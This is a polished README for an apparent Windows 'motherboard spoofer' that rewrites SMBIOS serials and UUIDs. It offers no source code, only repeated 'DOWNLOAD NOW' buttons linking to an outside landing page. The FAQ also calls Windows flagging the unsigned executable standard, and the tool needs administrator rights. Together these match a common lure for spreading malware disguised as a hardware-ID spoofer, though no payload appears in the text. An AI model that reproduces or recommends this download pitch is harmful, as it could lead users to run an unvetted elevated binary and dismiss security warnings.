<div align="center">

<img src="assets/banner.svg" width="100%" alt="Motherboard Spoofer banner"/>

# motherboard-spoofer-configurator 🧩⚙️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*A configurator for rewriting how your board introduces itself to the world — nothing more, nothing less.*

<p align="center">
  <a href="https://RoomJudgeGrab.github.io/motherboard-spoofer-configurator/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-DC2626?style=for-the-badge&logo=windows&logoColor=white&labelColor=B91C1C" width="550" alt="Download"/>
  </a>
</p>
</div>

## What This Is NOT

It's not a magic invisibility cloak. It's not a "delete my identity forever" button. It's not going to fix your drivers, overclock your RAM, or make Windows Update stop nagging you.

What it **is**: a focused, no-nonsense configurator for rewriting the identifiers your motherboard reports to the operating system — serial numbers, SMBIOS fields, board UUIDs, the stuff firmware whispers to software on every boot. That's it. That's the whole pitch.

## 🔍 Overview

Every motherboard ships with a set of identifiers baked into its firmware — SMBIOS/DMI tables, board serials, chassis asset tags, UUIDs. Software reads these values constantly, often silently, to build a fingerprint of the machine underneath it. Most of the time nobody notices. Sometimes it matters a lot: testing environments, virtualization labs, privacy-conscious setups, licensing sandboxes, or just plain curiosity about what your own hardware is broadcasting.

`motherboard-spoofer-configurator` exists because editing these values by hand is miserable. You're staring at raw SMBIOS tables, cross-referencing vendor documentation, praying you don't brick a boot sequence. This tool wraps that entire mess into a clean configuration layer — pick your fields, generate valid values, apply, done. No registry archaeology, no fifteen-tab guide-hopping, no guesswork.

Who's this for? Firmware tinkerers. QA engineers running matrixed test rigs that need distinct hardware fingerprints per VM. Privacy-first users who think their board's serial number is nobody's business. Anyone who's ever opened a terminal, typed `wmic baseboard get serialnumber`, and thought "why is this so ugly."

<blockquote>

If you're expecting a silver bullet against every fingerprinting technique on Earth — this configurator handles motherboard-level identifiers. That's the scope. That's the honesty.

</blockquote>

<p align="center">

  <a href="https://RoomJudgeGrab.github.io/motherboard-spoofer-configurator/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-DC2626?style=for-the-badge&logo=windows&logoColor=white&labelColor=B91C1C" width="550" alt="Download"/>
  </a>

</p>

---

## 🎛️ What's Actually Under The Hood

- **Field-level SMBIOS editing** — touch board serial, product name, UUID, and asset tag independently. No all-or-nothing switches.

- **Profile presets** — save a configuration as a named profile and reload it in one click. Great for testing multiple hardware personas without retyping anything.

- **Value validation on the fly** — the configurator checks formatting before you apply, so you don't discover a typo three reboots later.

- **Snapshot & restore** — capture your current identifiers before touching anything. One button gets you back to stock.

- **Dry-run preview** — see exactly what will change before committing. No surprises, no faith-based clicking.

- **Lightweight footprint** — a single executable. No background services, no telemetry phoning home, no scheduled tasks quietly living in Task Scheduler.

- **Dark & light themes** — because staring at a stark white utility at 2am is a crime against your eyes.

- **Portable mode** — run it from a USB stick. Nothing gets written outside the folder you choose.

> [!TIP]
> Save a profile called `baseline` the moment you install. Future-you will thank present-you.

---

## 🚀 Getting Started

1. Hit the download button above — it routes to the official landing page, not some mirror.

2. Run the executable. No installer wizard, no five-minute unpacking animation.

3. Pick a profile or build one from scratch using the field editor.

4. Review the preview, click Apply, restart when prompted.

> [!IMPORTANT]
> Always create a snapshot before your first Apply. It's a five-second habit that saves hours.

---

## 🖥️ System Requirements

| Requirement | Details |
|---|---|
| OS | Windows 10 (64-bit) or Windows 11 |
| Privileges | Administrator (firmware-level fields require elevation) |
| Disk | Under 50 MB, standalone binary |
| Dependencies | None — no runtime, no framework, no background service |
| Internet | Not required after download |

![Standalone](https://img.shields.io/badge/dependencies-none-success?style=flat-square) ![Arch](https://img.shields.io/badge/architecture-x64-informational?style=flat-square) ![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square)

---

## ⚙️ How It Works

1. **Read** — the configurator queries current SMBIOS/DMI values directly from firmware.

2. **Snapshot** — original values get saved locally so you can always roll back.

3. **Edit** — you modify fields through the UI, values get validated in real time.

4. **Preview** — a diff view shows exactly what's changing before anything is written.

5. **Apply** — the new configuration is committed and takes effect after reboot.

```mermaid
flowchart LR
    Read --> Snapshot --> Edit --> Preview --> Apply --> Reboot
```

---

## 🧯 Common Pitfalls

**Q: I applied a change and nothing looks different.**
A: Some fields only refresh after a full reboot, not a sign-out. Restart, then check again.

**Q: Windows flagged the executable on first run.**
A: Standard for unsigned firmware-adjacent tools. Verify the checksum on the landing page before trusting anything — always.

**Q: My snapshot restore didn't bring back the original UUID.**
A: Certain boards regenerate UUIDs on POST regardless of software state. That's a firmware quirk, not a configurator bug.

**Q: Apply button is greyed out.**
A: You're not running as Administrator. Firmware writes require elevation — no way around it.

**Q: Can this modify GPU or NIC identifiers too?**
A: No. Scope is motherboard-level fields only. That's a deliberate line, not a missing feature.

**Q: Values reverted after a BIOS update.**
A: Expected. A BIOS flash resets SMBIOS tables to vendor defaults. Reapply your profile afterward.

---

## 🎨 UI / UX Details

<details>
<summary>Keyboard shortcuts</summary>

| Shortcut | Action |
|---|---|
| `Ctrl+S` | Save current profile |
| `Ctrl+R` | Restore snapshot |
| `Ctrl+P` | Toggle preview diff |
| `Ctrl+Enter` | Apply configuration |
| `F5` | Refresh read values |

</details>

<details>
<summary>Themes & appearance</summary>

- Dark mode (default) — low-glare, built for late-night sessions.
- Light mode — for the brave souls who work with monitor brightness at 100%.
- Compact layout toggle — collapses field descriptions for power users who just want the grid.

</details>

Settings persist locally in a portable config file — no cloud sync, no account, no login screen. What you configure stays where you put it.

---

## 🤝 Contributing & Community

Pull requests are welcome — especially around SMBIOS field coverage and additional board-vendor quirks. Open an issue first if you're proposing something structural; small fixes can go straight to a PR.

> [!NOTE]
> This project is maintained by contributors in their spare time. Response times vary. Patience is a virtue and also a requirement.

If you hit a bug, include your board vendor and BIOS version — half of all reported issues turn out to be vendor-specific firmware behavior, not the tool itself.

---

## 📜 License

Released under the [MIT License](LICENSE), 2026. Use it, fork it, build on it — just don't pretend you wrote it from scratch.

---

## ⚠️ Disclaimer

This tool modifies firmware-reported identifiers on your own hardware. You are responsible for how and where you use it. It is provided as-is, with no warranty, express or implied. Always snapshot before you touch anything. Always read the field descriptions before applying. Always know what you're changing before you change it.

> [!WARNING]
> Modifying firmware-level values on unsupported or unusual boards carries inherent risk. Proceed deliberately, not blindly.

<p align="center">

  <a href="https://RoomJudgeGrab.github.io/motherboard-spoofer-configurator/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-DC2626?style=for-the-badge&logo=windows&logoColor=white&labelColor=B91C1C" width="550" alt="Download"/>
  </a>

</p>